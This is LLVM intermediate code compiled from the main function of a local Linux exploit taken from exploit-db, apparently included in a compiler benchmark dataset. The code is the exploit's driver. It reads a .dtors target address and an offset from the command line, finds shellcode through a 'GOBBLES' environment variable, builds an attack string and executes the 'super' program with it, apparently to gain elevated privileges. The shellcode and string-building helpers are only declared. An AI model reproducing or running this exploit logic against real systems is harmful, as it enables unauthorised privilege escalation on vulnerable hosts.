; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21674.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21674.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [65 x i8] c"\0AUsage: \0A%s -t <.dtors address> [ -o <offset> -A <allignment> ]\0A\00", align 1
@ALLIGN = common dso_local global i32 0, align 4
@DPA = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"t:o:A:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [3 x i8] c"%p\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"hehehe ;PPppPPPp\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"GOBBLES\00", align 1
@environ = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [24 x i8] c". problem re-executing\0A\00", align 1
@SUPER = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [32 x i8] c". target @ %p\0A. shellcode @ %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"super\00", align 1
@string = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [17 x i8] c"error executing\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %22

15:                                               ; preds = %2
  %16 = load i32, i32* @stderr, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 0) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i32, i32* @ALLIGN, align 4
  store i32 %23, i32* %9, align 4
  %24 = load i32, i32* @DPA, align 4
  store i32 %24, i32* %8, align 4
  br label %25

25:                                               ; preds = %53, %22
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call signext i8 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i8 %28, i8* %11, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8, i8* @EOF, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %29, %31
  br i1 %32, label %33, label %54

33:                                               ; preds = %25
  %34 = load i8, i8* %11, align 1
  %35 = sext i8 %34 to i32
  switch i32 %35, label %49 [
    i32 116, label %36
    i32 111, label %43
    i32 65, label %46
  ]

36:                                               ; preds = %33
  %37 = load i32, i32* @optarg, align 4
  %38 = call i32 @sscanf(i32 %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8** %12)
  %39 = load i8*, i8** %12, align 8
  %40 = ptrtoint i8* %39 to i64
  store i64 %40, i64* %6, align 8
  %41 = load i64, i64* %6, align 8
  %42 = add i64 %41, 4
  store i64 %42, i64* %6, align 8
  br label %53

43:                                               ; preds = %33
  %44 = load i32, i32* @optarg, align 4
  %45 = call i32 @atoi(i32 %44)
  store i32 %45, i32* %8, align 4
  br label %53

46:                                               ; preds = %33
  %47 = load i32, i32* @optarg, align 4
  %48 = call i32 @atoi(i32 %47)
  store i32 %48, i32* %9, align 4
  br label %53

49:                                               ; preds = %33
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0))
  %52 = call i32 @exit(i32 0) #3
  unreachable

53:                                               ; preds = %46, %43, %36
  br label %25

54:                                               ; preds = %25
  store i8* null, i8** %12, align 8
  %55 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  store i8* %55, i8** %12, align 8
  %56 = icmp eq i8* %55, null
  br i1 %56, label %57, label %71

57:                                               ; preds = %54
  %58 = call i32 (...) @stuff()
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 0
  %61 = load i8*, i8** %60, align 8
  %62 = load i8**, i8*** %5, align 8
  %63 = load i32, i32* @environ, align 4
  %64 = call i64 @execve(i8* %61, i8** %62, i32 %63)
  %65 = icmp ne i64 %64, 0
  br i1 %65, label %66, label %70

66:                                               ; preds = %57
  %67 = load i32, i32* @stderr, align 4
  %68 = call i32 (i32, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %69 = call i32 @exit(i32 1) #3
  unreachable

70:                                               ; preds = %57
  br label %71

71:                                               ; preds = %70, %54
  %72 = load i8*, i8** %12, align 8
  %73 = ptrtoint i8* %72 to i64
  store i64 %73, i64* %7, align 8
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 0
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @strlen(i8* %76)
  %78 = load i8*, i8** @SUPER, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = sub nsw i32 %77, %79
  store i32 %80, i32* %10, align 4
  %81 = load i32, i32* %10, align 4
  %82 = sext i32 %81 to i64
  %83 = load i64, i64* %7, align 8
  %84 = add i64 %83, %82
  store i64 %84, i64* %7, align 8
  %85 = load i32, i32* @stderr, align 4
  %86 = load i64, i64* %6, align 8
  %87 = load i64, i64* %7, align 8
  %88 = call i32 (i32, i8*, ...) @fprintf(i32 %85, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i64 %86, i64 %87)
  %89 = load i64, i64* %6, align 8
  %90 = load i64, i64* %7, align 8
  %91 = load i32, i32* %8, align 4
  %92 = load i32, i32* %9, align 4
  %93 = call i32 @buildstring(i64 %89, i64 %90, i32 %91, i32 %92)
  %94 = load i8*, i8** @SUPER, align 8
  %95 = load i32, i32* @string, align 4
  %96 = call i64 @execl(i8* %94, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i32 %95, i32* null)
  %97 = icmp ne i64 %96, 0
  br i1 %97, label %98, label %102

98:                                               ; preds = %71
  %99 = load i32, i32* @stderr, align 4
  %100 = call i32 (i32, i8*, ...) @fprintf(i32 %99, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %101 = call i32 @exit(i32 1) #3
  unreachable

102:                                              ; preds = %71
  %103 = load i32, i32* %3, align 4
  ret i32 %103
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @sscanf(i32, i8*, i8**) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @stuff(...) #1

declare dso_local i64 @execve(i8*, i8**, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @buildstring(i64, i64, i32, i32) #1

declare dso_local i64 @execl(i8*, i8*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
